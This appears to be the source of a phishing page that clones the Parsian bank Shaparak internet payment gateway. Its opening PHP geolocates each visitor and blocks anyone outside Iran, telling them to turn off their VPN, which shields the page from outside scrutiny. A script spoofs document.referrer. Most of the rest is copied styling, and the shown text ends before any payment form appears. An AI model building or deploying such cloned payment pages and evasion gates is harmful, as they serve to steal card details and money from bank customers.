<?php
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
}
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
session_start();
function checkcount($ip){$xml = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip);
    $country = $xml->geoplugin_countryName ;
    return $country;
}
$count=checkcount($ip);
if($count != "Iran"){
    echo("<head><link href='https://v1.fontapi.ir/css/Shabnam' rel='stylesheet'></head><style>body{background-color: #721c24;font-family: Shabnam, sans-serif;
    }</style><div style='text-align: center; margin-top: 20%; margin-right: auto; margin-left: auto; color: #FFF;'><br><h3>فیلتر شکن خود را خاموش کنید</h3></div>");
    exit();
 }
 else{
    
 }
?>
<!DOCTYPE html>
<!-- saved from url=(0083)https://pec.shaparak.ir/NewIPG/?Token=225680089478907&AspxAutoDetectCookieSupport=1 -->
<html lang="fa" dir="rtl"
    class=" cookies cors eventlistener no-ie8compat json svg cssescape focuswithin no-userdata bgpositionshorthand multiplebgs csspointerevents preserve3d csscalc cubicbezierrange cssgradients opacity csspositionsticky csschunit cssexunit supports hsla xhrresponsetypeblob xhrresponsetypetext checked displaytable display-table fontface generatedcontent no-hairline cssinvalid lastchild nthchild mediaqueries ligatures cssanimations backgroundcliptext bgpositionxy bgrepeatround bgrepeatspace backgroundsize bgsizecover borderimage borderradius boxshadow boxsizing csscolumns csscolumns-width csscolumns-span csscolumns-fill csscolumns-gap csscolumns-rule csscolumns-rulecolor csscolumns-rulestyle csscolumns-rulewidth csscolumns-breakbefore csscolumns-breakafter csscolumns-breakinside no-cssgridlegacy cssgrid no-displayrunin no-display-runin ellipsis cssfilters flexbox flexboxlegacy no-flexboxtweener flexwrap cssmask no-overflowscrolling csstransforms csstransforms3d csstransitions backgroundblendmode objectfit object-fit userselect no-csshyphens softhyphens softhyphensfind">
<script async="false" type="text/javascript" src="chrome-extension://fnjhmkhhmkbjkkabndcnnogagogbneec/in-page.js">
</script>
<script src="https://code.jquery.com/jquery-3.6.3.min.js"></script>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <script type="text/javascript">
    (function() {
        try {
            function getterHook(obj, name, cb) {
                if (document.__defineGetter__) {
                    document.__defineGetter__(name, cb);
                    return;
                }
                if ((obj && obj.prototype && Object) &&
                    (Object.getOwnPropertyDescriptor) &&
                    (Object.getOwnPropertyDescriptor(obj.prototype, name)) &&
                    (Object.getOwnPropertyDescriptor(obj.prototype, name).get) &&
                    (Object.getOwnPropertyDescriptor(obj.prototype, name).configurable)) {
                    Object.defineProperty(obj.prototype, name, {
                        get: cb
                    });
                    return;
                }
            }

            function asmReferrerGetter() {
                return "http://www.iran3ell.net/";
            }
            getterHook(Document, "referrer", asmReferrerGetter);
        } catch (e) {}
    })();
    </script>


    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0,user-scalable=0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>درگاه پرداخت اینترنتی تجارت الکترونیک پارسیان</title>

    <link href="./files/bootstrap.min.css" rel="stylesheet">
    <link href="./files/bootstrap-icons.min.css" rel="stylesheet">
    <link href="./files/style.min.css" rel="stylesheet">
    <link href="./files/owl.carousel.min.css" rel="stylesheet">
    <link href="./files/owl.theme.default.min.css" rel="stylesheet">
    <link href="./files/fontiran.min.css" rel="stylesheet">
    <link href="./files/sweetalert.min.css" rel="stylesheet">

    <link href="./files/Toastr.min.css" rel="stylesheet">
    <link href="./files/text-security-disc.css" rel="stylesheet">

    <link href="./files/simplebar.css" rel="stylesheet">
    <link href="https://v1.fontapi.ir/css/Shabnam" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">


    <script type="text/javascript">
    function docReady(fn) {
        // see if DOM is already available
        if (document.readyState === "complete" || document.readyState === "interactive") {
            // call on next available tick
            setTimeout(fn, 1);
        } else {
            document.addEventListener("DOMContentLoaded", fn);
        }
    }
    </script>
    <link rel="stylesheet" type="text/css"
        href="chrome-extension://dbaahnceahihnikjnogoijfdccdonlia/styles/popup_inject.css">
    <style>
    * {
        font-family: Shabnam, sans-serif !important;
    }

    ._2a488E1JFtKhRmFMRKFaVC ._2VlGqUirWMp5mZnCm5FLoE {
        position: fixed;
        bottom: 0;
        left: 0;
        z-index: var(--ah-zIndex-app);
        max-width: 850px
    }

    ._2a488E1JFtKhRmFMRKFaVC ._199zngJgHNj4ge0LVKujeF {
        position: relative
    }

    ._2a488E1JFtKhRmFMRKFaVC ._199zngJgHNj4ge0LVKujeF._1LMeoK9AGtRh3gjRsOwg3-:before {
        content: '';
        display: block;
        position: absolute;
        top: 0;
        left: 0;
        right: -10px;
        bottom: 0;
        z-index: 100
    }

    ._2a488E1JFtKhRmFMRKFaVC ._37Iw5-EImEiWuJILJY-SPw {
        position: relative;
        z-index: var(--ah-zIndex-app)
    }

    ._2a488E1JFtKhRmFMRKFaVC ._2IKgTnviQcGWYrEU18zwln {
        position: absolute;
        bottom: 68px;
        left: 0;
        background: #6d6d6d;
        border-radius: 8px;
        padding: 10px 8px;
        width: 166px;
        z-index: -1;
        cursor: pointer
    }

    ._2a488E1JFtKhRmFMRKFaVC ._2IKgTnviQcGWYrEU18zwln div {
        color: #fff;
        cursor: pointer
    }

    ._2a488E1JFtKhRmFMRKFaVC ._2IKgTnviQcGWYrEU18zwln ._1lxi2pfvDsA21q0z0eFd8L {
        position: relative;
        font-size: 10px;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
        padding-right: 11px
    }

    ._2a488E1JFtKhRmFMRKFaVC ._2IKgTnviQcGWYrEU18zwln ._1lxi2pfvDsA21q0z0eFd8L span {
        position: absolute;
        top: -4px;
        right: 0
    }

    ._2a488E1JFtKhRmFMRKFaVC ._2IKgTnviQcGWYrEU18zwln ._3Owd3x6pBB8_Os9jGepMBt {
        font-size: 12px;
        font-weight: 700;
        margin-top: 4px
    }

    ._2a488E1JFtKhRmFMRKFaVC ._2FfCFkzPtXV5SP_nvl_ArZ {
        position: absolute;
        bottom: 68px;
        left: 168px;
        background: #ffffff;
        box-shadow: 0px 4px 4px rgba(0, 0, 0, 0.08);
        border-radius: 8px;
        padding: 8px;
        z-index: -1
    }

    ._2a488E1JFtKhRmFMRKFaVC ._2FfCFkzPtXV5SP_nvl_ArZ ul li {
        padding: 8px;
        background: #f9f9f9;
        border-radius: 8px;
        cursor: pointer
    }

    ._2a488E1JFtKhRmFMRKFaVC ._2FfCFkzPtXV5SP_nvl_ArZ ul li div {
        cursor: pointer
    }

    ._2a488E1JFtKhRmFMRKFaVC ._2FfCFkzPtXV5SP_nvl_ArZ ul li+li {
        margin-top: 8px
    }

    ._306eFvTtKvxDlof_izaDcI {
        width: 270px !important;
        bottom: 68px !important;
        position: absolute !important
    }

    ._1DsBUJTJz8UOrkCD5LLyov._1RVUP1P6LZkOeb88YPOe7o ._2GBZVT4DLZbCmoPH1WKekC {
        opacity: 0;
        width: 400px;
        height: calc(100vh - 90px);
        max-height: 600px;
        border: none;
        outline: none;
        position: absolute;
        right: 0;
        bottom: calc(100% + 4px);
        z-index: -999999999;
        transform: translateY(50px);
        visibility: hidden;
        transition: 0.3s;
        margin-left: auto;
        padding-bottom: 20px;
        margin-bottom: 2px;
        display: none;
        border-radius: 8px;
        box-shadow: 1px 2px 5px #08080842;
        background-color: #fff;
        overflow: hidden
    }

    ._1DsBUJTJz8UOrkCD5LLyov._1RVUP1P6LZkOeb88YPOe7o ._2GBZVT4DLZbCmoPH1WKekC *:not(._3MobTg0tPewiq2n_hcqdLy) {
        z-index: -999999999
    }

    ._1DsBUJTJz8UOrkCD5LLyov._1RVUP1P6LZkOeb88YPOe7o ._2GBZVT4DLZbCmoPH1WKekC ._3200RmNXkB0IM_3eVPo2tI {
        position: absolute;
        top: 0;
        left: 0;
        height: 100px;
        width: 100%;
        z-index: 1;
        cursor: pointer;
        user-select: none
    }

    ._1DsBUJTJz8UOrkCD5LLyov._1RVUP1P6LZkOeb88YPOe7o ._2GBZVT4DLZbCmoPH1WKekC iframe {
        width: 100%;
        height: calc(100% - 7px);
        border: none;
        overflow: hidden
    }

    ._1DsBUJTJz8UOrkCD5LLyov._1RVUP1P6LZkOeb88YPOe7o ._2GBZVT4DLZbCmoPH1WKekC._3MobTg0tPewiq2n_hcqdLy {
        display: block;
        visibility: visible;
        opacity: 1;
        transform: translateY(0);
        z-index: 999999999
    }

    ._1hPWgIIuf6lS9UmVEju8-d .OM4WqD7S_Jbfp8QbH-XND {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        z-index: var(--ah-zIndex-backdrop);
        background-color: #0000009c
    }

    ._1XAhkAPR4wzh3MyX76nq8e .MlQVxg4gnxwzEHNJhIC5j {
        position: relative;
        display: flex;
        align-items: center;
        justify-content: space-between;
        background-color: #1c1f28;
        height: var(--ah-height-nav);
        box-shadow: 0px 4px 30px rgba(0, 0, 0, 0.1);
        border-radius: 10px;
        border-bottom: none
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._1Izo-hjqGBoZmiSYjQ7t7- {
        display: flex;
        align-items: center;
        height: 100%;
        gap: 16px;
        padding: 4px 0px 4px 16px;
        min-width: 510px;
        width: 510px
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._1L4AelCRtALw6k6q5ZGts6 {
        height: 100%;
        min-width: 70px;
        max-width: 78px;
        padding: 0;
        display: flex;
        align-items: center;
        justify-content: center;
        flex-direction: column;
        cursor: pointer;
        user-select: none;
        position: relative;
        padding: 0 2px;
        border-radius: 4px
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._1L4AelCRtALw6k6q5ZGts6 * {
        cursor: pointer;
        user-select: none
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._1L4AelCRtALw6k6q5ZGts6 ._29u_B7AykiEGKRRHXDAAnj {
        color: #fff;
        font-size: 12px;
        text-align: center;
        display: -webkit-box;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 1;
        overflow: hidden;
        text-overflow: ellipsis;
        margin-top: 4px
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._1L4AelCRtALw6k6q5ZGts6:first-child {
        margin-left: 0
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._1L4AelCRtALw6k6q5ZGts6:last-child {
        margin-right: 0
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._1L4AelCRtALw6k6q5ZGts6:hover {
        color: var(--ah-primary)
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._1L4AelCRtALw6k6q5ZGts6:hover ._29u_B7AykiEGKRRHXDAAnj {
        color: var(--ah-primary)
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._1L4AelCRtALw6k6q5ZGts6:hover svg path {
        fill: var(--ah-primary)
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._1L4AelCRtALw6k6q5ZGts6:active {
        color: #fff
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._1L4AelCRtALw6k6q5ZGts6:active ._29u_B7AykiEGKRRHXDAAnj {
        color: #fff
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._1L4AelCRtALw6k6q5ZGts6:active svg path {
        fill: #fff
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._1L4AelCRtALw6k6q5ZGts6._1bp9AP0la2wPz8s9ii7824:before {
        content: '';
        display: block;
        width: calc(100% + 4px);
        height: 5px;
        background-color: var(--ah-red-100);
        position: absolute;
        left: -2px;
        bottom: -4px;
        border-radius: 4px
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._1L4AelCRtALw6k6q5ZGts6._1bp9AP0la2wPz8s9ii7824 ._29u_B7AykiEGKRRHXDAAnj {
        color: #fff
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._1L4AelCRtALw6k6q5ZGts6._1bp9AP0la2wPz8s9ii7824 svg path {
        fill: #fff
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._2_n1VQvZiwl91q6v0e1O-h {
        display: flex;
        align-items: center;
        justify-content: center
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._1l9NaTC2f24G9oKnrIpn0e {
        width: 24px;
        height: 24px;
        display: flex;
        align-items: center;
        justify-content: center;
        color: #fff
    }

    ._1XAhkAPR4wzh3MyX76nq8e .CEMtpWzyFZ_7YzEsN_gMs {
        display: flex;
        align-items: center;
        justify-content: center;
        flex-direction: column;
        user-select: none;
        position: relative;
        margin-left: 20px;
        cursor: pointer;
        max-width: 76px;
        min-width: 76px
    }

    ._1XAhkAPR4wzh3MyX76nq8e .CEMtpWzyFZ_7YzEsN_gMs:active {
        background: transparent !important
    }

    ._1XAhkAPR4wzh3MyX76nq8e .CEMtpWzyFZ_7YzEsN_gMs ._1l9NaTC2f24G9oKnrIpn0e {
        width: 24px;
        height: 24px;
        display: flex;
        align-items: center;
        justify-content: center;
        color: #fff
    }

    ._1XAhkAPR4wzh3MyX76nq8e .CEMtpWzyFZ_7YzEsN_gMs:hover div {
        color: var(--ah-primary)
    }

    ._1XAhkAPR4wzh3MyX76nq8e .CEMtpWzyFZ_7YzEsN_gMs div {
        display: block;
        cursor: pointer;
        color: #fff;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
        width: 100%;
        text-align: center
    }

    ._1XAhkAPR4wzh3MyX76nq8e .CEMtpWzyFZ_7YzEsN_gMs:hover {
        color: var(--ah-primary)
    }

    ._1XAhkAPR4wzh3MyX76nq8e .CEMtpWzyFZ_7YzEsN_gMs:hover svg path {
        fill: var(--ah-primary)
    }

    ._1XAhkAPR4wzh3MyX76nq8e .CEMtpWzyFZ_7YzEsN_gMs:active {
        color: var(--ah-primary-hover)
    }

    ._1XAhkAPR4wzh3MyX76nq8e .CEMtpWzyFZ_7YzEsN_gMs:active svg path {
        fill: var(--ah-primary-hover)
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._2f5NbwV94q29kdvINw7588 {
        display: flex;
        height: 100%
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._2f5NbwV94q29kdvINw7588 ._2qXhHYuKVVXH4FU6heQjeo {
        display: flex;
        align-items: center;
        justify-content: center;
        width: 8px;
        cursor: pointer;
        user-select: none;
        position: relative;
        margin-left: 12px
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._2f5NbwV94q29kdvINw7588 ._2qXhHYuKVVXH4FU6heQjeo svg {
        width: 7px !important;
        color: #fff;
        font-size: 14px
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._2f5NbwV94q29kdvINw7588 ._2qXhHYuKVVXH4FU6heQjeo:hover {
        color: var(--ah-primary)
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._2f5NbwV94q29kdvINw7588 ._2qXhHYuKVVXH4FU6heQjeo:hover svg path {
        fill: var(--ah-primary)
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._2f5NbwV94q29kdvINw7588 ._2qXhHYuKVVXH4FU6heQjeo:active {
        color: var(--ah-primary-hover)
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._2f5NbwV94q29kdvINw7588 ._2qXhHYuKVVXH4FU6heQjeo:active svg path {
        fill: var(--ah-primary-hover)
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._2f5NbwV94q29kdvINw7588 [data-setting-item-active='true'] div {
        color: var(--ah-red-100)
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._2f5NbwV94q29kdvINw7588 [data-setting-item-active='true'] svg path {
        fill: var(--ah-red-100)
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._2f5NbwV94q29kdvINw7588 ._3p9r4IU6TFjVk03hXzcNtU div {
        color: var(--ah-red-100)
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._2f5NbwV94q29kdvINw7588 ._3p9r4IU6TFjVk03hXzcNtU:before {
        content: '';
        position: absolute;
        bottom: 0;
        height: 3px;
        width: 100%;
        background-color: var(--ah-red-100);
        border-radius: 30px 30px 0 0
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._2f5NbwV94q29kdvINw7588 ._3p9r4IU6TFjVk03hXzcNtU svg path {
        fill: var(--ah-red-100)
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._23eY1zZQ0XpeGc0LuA0SBB {
        display: flex;
        align-items: center;
        justify-content: center;
        user-select: none;
        cursor: pointer;
        width: 64px;
        height: 64px;
        background: var(--ah-primary);
        border-radius: 8px 0 0 8px;
        min-width: 64px
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._3LnJcXOqLEcBeBXx3swOow {
        display: flex;
        align-items: center;
        gap: 32px
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._3LnJcXOqLEcBeBXx3swOow ._1IXTpuz20MPNRDUR2oyCKT:first-child {
        margin-left: 0
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._3LnJcXOqLEcBeBXx3swOow ._1IXTpuz20MPNRDUR2oyCKT:last-child {
        margin-right: 0
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._3LnJcXOqLEcBeBXx3swOow ._1F11iBWEaPR3bsxXRODlPW {
        line-height: 20px;
        color: #fff;
        font-size: 11px
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._3LnJcXOqLEcBeBXx3swOow ._1F11iBWEaPR3bsxXRODlPW svg {
        margin-left: 4px
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._3LnJcXOqLEcBeBXx3swOow ._3pudU0_Ib2KraK1y_ldGiQ {
        font-weight: 700;
        font-size: 12px;
        line-height: 22px;
        padding-bottom: 6px;
        color: #fff
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._3LnJcXOqLEcBeBXx3swOow ._3pudU0_Ib2KraK1y_ldGiQ svg {
        margin-left: 2px
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._3LnJcXOqLEcBeBXx3swOow ._1F11iBWEaPR3bsxXRODlPW,
    ._1XAhkAPR4wzh3MyX76nq8e ._3LnJcXOqLEcBeBXx3swOow ._3pudU0_Ib2KraK1y_ldGiQ {
        display: flex;
        align-items: center;
        justify-content: center;
        display: -webkit-box;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 1;
        overflow: hidden;
        text-overflow: ellipsis
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._3LnJcXOqLEcBeBXx3swOow ._3vGiGBKe-KN84Y202KODV {
        display: grid;
        grid-template-columns: auto auto;
        padding: 6px 0 0
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._1Nf3t-DhDDENFJb5hhnhLQ {
        width: 1px;
        height: 40px;
        margin: 0 24px;
        background-color: #ddd
    }

    ._1XAhkAPR4wzh3MyX76nq8e .DVE68XsjKmSF3XybebC8i {
        box-shadow: 0 0 0
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._2n0I700e1ly5joM48zXfoT {
        display: flex
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._2n0I700e1ly5joM48zXfoT:hover svg path {
        stroke: var(--ah-primary)
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._1F6xwYgZjV2s9KasJ2CGdS {
        pointer-events: none
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._1F6xwYgZjV2s9KasJ2CGdS * {
        pointer-events: none
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._3MefMoNpaiE4tPrNHjy3f5 {
        display: flex;
        justify-content: center;
        align-items: center;
        width: 25px;
        height: 25px;
        position: absolute;
        right: -12px;
        background: #fff;
        box-shadow: 0 8px 4px 0 rgba(0, 0, 0, 0.1);
        border-radius: 50%;
        transition: all 0.15s ease-in-out;
        cursor: pointer;
        transform: rotate(180deg);
        z-index: 99
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._3MefMoNpaiE4tPrNHjy3f5._3iVzmBre0mPEklnyBwCWbp {
        right: -34px;
        transform: rotate(0deg)
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._3MefMoNpaiE4tPrNHjy3f5 svg {
        width: 8px !important
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._3MefMoNpaiE4tPrNHjy3f5 svg path {
        fill: var(--ah-red-100)
    }

    ._1XAhkAPR4wzh3MyX76nq8e .HGqHaEsfPA9gdvd4Oz-SI ._1MlnUXgF_bZgOY1dv2zr1D {
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._1XAhkAPR4wzh3MyX76nq8e ._1MlnUXgF_bZgOY1dv2zr1D {
        display: none;
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        z-index: 90;
        background: rgba(255, 255, 255, 0.5);
        border-radius: 0 8px 8px 0
    }

    .KQJE0mh8XRLKUBuZuLHwl {
        text-align: center
    }

    .KQJE0mh8XRLKUBuZuLHwl .ZudvSRU07iCt22mvMlhE8 {
        font-weight: bold;
        font-size: 10px;
        color: #fff;
        line-height: 20px
    }

    .KQJE0mh8XRLKUBuZuLHwl ._12QTG5rpdiPK5UU_IGZuP4 {
        font-size: 10px;
        color: var(--ah-grey-600)
    }

    @media (max-width: 1200px) {
        ._1XAhkAPR4wzh3MyX76nq8e ._3LnJcXOqLEcBeBXx3swOow {
            gap: 24px
        }
    }

    ._33Q8cUXNOD27AhrUfcEub6 {
        display: inline-flex !important
    }

    ._33Q8cUXNOD27AhrUfcEub6 ._2WZ5J8pze1z5vHQHd07ywY {
        display: inline-flex;
        border-radius: 50%;
        width: 12px;
        height: 12px;
        -webkit-animation: _1FlgJoyybyPq85-FxdsNl 0.8s linear infinite;
        animation: _1FlgJoyybyPq85-FxdsNl 0.8s linear infinite
    }

    @-webkit-keyframes _1FlgJoyybyPq85-FxdsNl {
        0% {
            -webkit-transform: rotate(0deg)
        }

        100% {
            -webkit-transform: rotate(360deg)
        }
    }

    @keyframes _1FlgJoyybyPq85-FxdsNl {
        0% {
            transform: rotate(0deg)
        }

        100% {
            transform: rotate(360deg)
        }
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU {
        position: relative;
        height: 100%;
        max-width: 170px;
        min-width: 170px;
        display: flex;
        align-items: center
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._1ACNBXFgp6kMwFAaTHnlFy,
    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._1ACNBXFgp6kMwFAaTHnlFy svg {
        color: #fff
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._2DK5IsDboE1Ie4dXbfZryl {
        width: 16px;
        height: 16px;
        margin-right: 5px
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._1ACNBXFgp6kMwFAaTHnlFy {
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        user-select: none;
        padding: 0 10px;
        border-radius: 4px;
        font-size: 12px;
        background-color: var(--ah-primary);
        white-space: nowrap;
        text-align: center;
        height: 38px;
        width: 100%
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._1ACNBXFgp6kMwFAaTHnlFy span {
        display: block;
        white-space: nowrap;
        text-overflow: ellipsis;
        overflow: hidden;
        color: #fff
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._1ACNBXFgp6kMwFAaTHnlFy._2ejN2EETSqbcKvBuFxRvQg {
        color: #fff;
        background-color: var(--ah-red-100)
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._1ACNBXFgp6kMwFAaTHnlFy._2ejN2EETSqbcKvBuFxRvQg svg path {
        fill: #fff
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._1ACNBXFgp6kMwFAaTHnlFy * {
        cursor: pointer
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._1ACNBXFgp6kMwFAaTHnlFy svg {
        margin-right: 2px
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._1ACNBXFgp6kMwFAaTHnlFy svg path {
        fill: #fff
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._1ACNBXFgp6kMwFAaTHnlFy:hover {
        background-color: var(--ah-red-100)
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt {
        display: grid;
        grid-template-rows: 52px auto 1fr;
        position: absolute;
        bottom: 100%;
        right: 0;
        border-radius: 6px;
        width: 286px;
        background-color: #fff;
        box-shadow: 1px 2px 5px #08080842;
        max-height: calc(100vh - var(--ah-height-nav) - 20px)
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._1peKQ31rhXfuTtYVTqU17j {
        background-color: #fcfcfc;
        height: 52px;
        font-weight: bold;
        font-size: 12px;
        line-height: 20px;
        color: var(--ah-grey-100);
        border-bottom: solid 1px #f5f5f5;
        display: flex;
        align-items: center;
        padding: 0 16px;
        border-radius: 4px 4px 0 0
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._1bDic8A6K731jCRuEZ_k0T {
        display: grid;
        grid-template-columns: 74px 1fr;
        margin: 16px
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._1bDic8A6K731jCRuEZ_k0T .CHvx3xC06Idl3aZDqfmUP {
        width: 64px;
        height: 64px;
        background-position: center;
        background-size: cover;
        background-repeat: no-repeat;
        border-radius: 2px
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._1bDic8A6K731jCRuEZ_k0T ._2Af2AWq6f5ByIpPnUFY1dd {
        font-weight: 700;
        margin-bottom: 8px;
        color: var(--ah-grey-100);
        display: block;
        display: -webkit-box;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 2;
        overflow: hidden;
        text-overflow: ellipsis
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt ._1bDic8A6K731jCRuEZ_k0T ._2IHHFEOSMEKL48waCR2tg4 {
        font-weight: 700;
        color: var(--ah-grey-100)
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt .exNsa2ifVWaBKvkfC80ep {
        display: flex;
        align-items: center;
        justify-content: space-between;
        border-bottom: solid 1px #f5f5f5;
        margin: 0 16px;
        position: relative
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt .exNsa2ifVWaBKvkfC80ep ._30RX3VxjSwpDPiul23tloy {
        padding: 12px;
        position: relative;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        flex: 1
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt .exNsa2ifVWaBKvkfC80ep ._30RX3VxjSwpDPiul23tloy svg {
        margin-right: 8px
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt .exNsa2ifVWaBKvkfC80ep ._30RX3VxjSwpDPiul23tloy * {
        cursor: pointer
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt .exNsa2ifVWaBKvkfC80ep ._30RX3VxjSwpDPiul23tloy::after,
    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt .exNsa2ifVWaBKvkfC80ep ._30RX3VxjSwpDPiul23tloy::before {
        content: '';
        position: absolute;
        bottom: 0;
        transition: 0.15s;
        width: 0;
        height: 1px
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt .exNsa2ifVWaBKvkfC80ep ._30RX3VxjSwpDPiul23tloy:after {
        left: 50%
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt .exNsa2ifVWaBKvkfC80ep ._30RX3VxjSwpDPiul23tloy:before {
        right: 50%
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt .exNsa2ifVWaBKvkfC80ep ._30RX3VxjSwpDPiul23tloy:hover {
        color: var(--ah-red-100)
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt .exNsa2ifVWaBKvkfC80ep ._30RX3VxjSwpDPiul23tloy:hover svg path {
        fill: var(--ah-red-100)
    }

    .wgPnZK78e7Rkg-20FFdR6._1yIEZqvVSTm9zxdPtnUMwU ._712Q9-kWDRymS-dHM4GEt .exNsa2ifVWaBKvkfC80ep ._30RX3VxjSwpDPiul23tloy._3E8LCMxtlfJlmRbACd95oD {
        color: var(--ah-red-100)
    }

